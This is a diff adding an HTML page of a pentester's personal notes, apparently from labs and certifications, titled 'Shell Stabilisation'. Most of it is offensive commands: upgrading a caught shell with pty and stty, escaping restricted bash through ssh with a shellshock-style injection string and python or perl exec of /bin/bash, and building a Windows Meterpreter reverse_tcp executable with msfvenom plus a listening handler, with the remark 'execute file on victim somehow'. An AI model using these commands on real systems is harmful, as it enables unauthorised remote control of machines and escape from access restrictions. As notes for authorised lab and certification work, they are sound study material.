@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta https-equiv="content-type" content=
+  "text/html; charset=UTF-8">
+  <title>Shells</title>
+  <meta name="viewport" content=
+  "initial-scale=1.0, maximum-scale=1.0, width=device-width">
+  <meta name="description" content=
+  "My notes from various labs and certs.">
+  <meta name="robots" content="index, follow">
+  <meta property="og:url" content="https://eli2k.com/">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Home">
+  <meta property="og:description" content="Home">
+  <meta property="og:image" content=
+  "https://eli2k.com/resources/images/homepage.png">
+  <link rel="stylesheet" href=
+  "https://eli2k.com/resources/css/style.css">
+  <link rel="icon" href=
+  "https://eli2k.com/resources/images/bluscrn.gif" type=
+  "image/gif">
+  <link rel="stylesheet" href=
+  "https://eli2k.com/resources/css/prism.css">
+  <link rel="stylesheet" href=
+  "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+<body>
+  <input type="checkbox" class="theme-switch" id="theme-switch">
+  <div id="page">
+    <label for="theme-switch" class="switch-label"></label>
+    <script src="https://eli2k.com/resources/js/prism.js"></script>
+    
+    <script>
+
+    NekoType = "robot"
+    </script>
+    <h1 id="nl">
+    <script src=
+    "https://webneko.net/n20171213.js"></script><a href="https://webneko.net">Neko</a></h1>
+    <div id="container">
+      <div id="header">
+        <div class="text-container">
+          <span>E</span> <span>L</span> <span>I</span> <span>2</span> <span>K</span>
+        </div>
+      </div>
+      <div id="left-sidebar"></div>
+      <div class="divider"></div>
+      <div class="pageContent">
+        <div class="nav border">
+          <ul>
+            <a href="https://eli2k.com/" title="The homepage. acts as an index for all of the indexes.">
+              <li>Home
+              </li>
+            </a>
+            <a href="https://github.com/Eli2k765" title="My Github.">
+              <li>Github
+              </li>
+            </a>
+          </ul>
+        </div>
+        <div class="page-content blog border"><button id="toggle-all-btn">Show All</button>
+          <div class="box">
+            <div class="inner-box-content">
+              <div class="article-wrapper">
+                <h1>Shell Stabilisation</h1>
+                <p class="alert">How to fix your shells and escape
+                rbash</p><strong>Last updated: May 4th, 2023</strong>
+                <article>
+                  <div id="contain">
+                    <h3>Stabilising a Linux Shell</h3>
+                    <div>
+                      <p>There are two general approaches to this. If
+                      the first doesn't work, try the second.</p>
+                      <pre><code class=
+                    "language-bash">SHELL=/bin/bash script -q /dev/null
+Ctrl-Z
+stty raw -echo
+fg
+reset
+xterm
+
+## or
+
+python3 -c "import pty;pty.spawn('/bin/bash')"
+export TERM=xterm; export SHELL=/bin/bash
+CTRL+Z
+stty raw -echo;fg</code></pre>
+                    </div>
+                    <h3>Escaping rbash</h3>
+                    <div>
+                      <ol>
+                        <li>env</li>
+                        <li>echo $PATH</li>
+                        <li>echo $SHELL</li>
+                        <li>check what's allowed
+                        <ul>
+                          <li>if / is allowed what about
+                          /bin/sh?</li>
+                          <li>if unix commands are allowed, try cp
+                          /bin/sh /dir/from/PATH; sh</li>
+                          <li>can you use export?</li>
+                        </ul>
+                        </li>
+                        <li>ssh
+                        <ul>
+                          <li>ssh user@x.x.x.x -t “/bin/bash”</li>
+                          <li>ssh user@x.x.x.x -t “bash
+                          --noprofile”</li>
+                          <li>ssh user@x.x.x.x -t “() {:;};
+                          /bin/bash”</li>
+                        </ul>
+                        </li>
+                        <li>file writing
+                        <ul>
+                          <li>echo “code” | tee script.sh</li>
+                          <li>python -c 'import os;
+                          os.system(”/bin/bash")'</li>
+                          <li>perl -e ‘exec “/bin/bash”;’</li>
+                        </ul>
+                        </li>
+                      </ol>
+                    </div>
+                    <h3>Spawning a Meterpreter Shell</h3>
+                    <div>
+                    <ul>
+                      <li>using shell_to_meterpreter</li>
+                      <pre><code class=
+                    "language-bash">#in msfconsole
+use shell_to
+set session 1</code></pre>
+                      <li>creating an executable</li>
+                      <pre><code class=
+                    "language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.180.131 LPORT=4444 -f exe -o shell.exe
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.180.131; set LPORT 4444; run"
+#execute file on victim somehow</code></pre>
+                    </ul>
+                    </div>
+                  </div>
+                </article>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="footer border"></div>
+      </div>
+      <script src=
+      "https://eli2k.com/resources/js/themeSwitch.js"></script>
+      <script src=
+      "https://eli2k.com/resources/js/collapseList.js"></script>
+      
+    </div>
+  </div>
+</body>
+</html>
